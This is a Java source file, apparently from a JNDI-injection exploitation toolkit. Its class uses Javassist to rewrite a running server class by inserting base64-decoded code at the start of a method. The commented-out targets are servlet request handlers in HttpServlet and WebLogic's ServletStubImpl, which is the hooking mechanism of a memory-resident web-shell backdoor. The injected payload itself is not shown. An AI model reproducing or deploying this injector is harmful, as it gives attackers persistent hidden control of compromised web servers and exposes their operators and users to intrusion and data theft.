package com.qi4l.jndi.template.Agent.utli;

import javassist.*;

import java.util.ArrayList;
import java.util.List;

public class ClassModifier {
    // Hook 类信息，类名,方法名,方法参数(逗号分隔)
    public static ArrayList<String> HOOK_CLASS_INFORMATION_MAP = new ArrayList<String>();

    // Hook 类方法字符串
    public static String HOOK_METHOD_CODE;

    public static List<Object> insert() throws Exception {

        // 初始化要 hook 的方法信息
        initHookClassINFORMATION();

        List<Object> classObj = getHookClassBytes();

        if (classObj == null) {
            return null;
        }

        String    targetClassName = classObj.get(0).toString();
        byte[]    targetClassBody = (byte[]) classObj.get(1);
        ClassPool cp              = ClassPool.getDefault();
        cp.insertClassPath(new ByteArrayClassPath(targetClassName, targetClassBody));
        CtClass targetClass = cp.get(targetClassName);

        String   methodName = HOOK_CLASS_INFORMATION_MAP.get(1);
        String[] paramList  = HOOK_CLASS_INFORMATION_MAP.get(2).split(",");

        List<CtClass> paramClasses = new ArrayList<CtClass>();
        for (String param : paramList) {
            CtClass ctClass = cp.get(param);
            paramClasses.add(ctClass);
        }

        CtMethod ctMethod = targetClass.getDeclaredMethod(methodName, paramClasses.toArray(new CtClass[paramClasses.size()]));
        ctMethod.insertBefore(base64Decode(HOOK_METHOD_CODE));
        targetClass.detach();

        List<Object> list = new ArrayList<Object>();
        list.add(targetClassName);
        list.add(targetClass.toBytecode());
        return list;
    }


    private static List<Object> getHookClassBytes() throws Exception {
        ClassPool classPool = ClassPool.getDefault();

        try {
            // 用 Javassist 获取目标环境中，目标类的类字节码
            String className = HOOK_CLASS_INFORMATION_MAP.get(0);
            classPool.insertClassPath(new ClassClassPath(Thread.currentThread().getContextClassLoader().loadClass(className)));
            CtClass      targetClass = classPool.get(className);
            List<Object> obj         = new ArrayList<Object>();
            obj.add(className);
            obj.add(targetClass.toBytecode());
            targetClass.detach();
            return obj;
        } catch (ClassNotFoundException ignored) {
        }
        return null;
    }

    public static String base64Decode(String bs) throws Exception {
        Class  base64;
        byte[] value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", new Class[]{}).invoke(null, (Object[]) null);
            value = (byte[]) decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
        } catch (Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
            } catch (Exception ignored) {
            }
        }

        return new String(value);
    }

    public static void initHookClassINFORMATION() {
//		HOOK_CLASS_INFORMATION_MAP.add("javax.servlet.http.HttpServlet");
//		HOOK_CLASS_INFORMATION_MAP.add("service");
//		HOOK_CLASS_INFORMATION_MAP.add("javax.servlet.ServletRequest,javax.servlet.ServletResponse");

//		ArrayList list1 = new ArrayList();
//		list1.add("jakarta.servlet.http.HttpServlet");
//		list1.add("service");
//		list1.add("jakarta.servlet.ServletRequest,jakarta.servlet.ServletResponse");
//
//		HOOK_CLASS_INFORMATION_MAP.add(list1);
//
//		ArrayList list2 = new ArrayList();
//		list2.add("weblogic.servlet.internal.ServletStubImpl");
//		list2.add("execute");
//		list2.add("javax.servlet.ServletRequest,javax.servlet.ServletResponse");
//
//		HOOK_CLASS_INFORMATION_MAP.add(list2);
    }
}
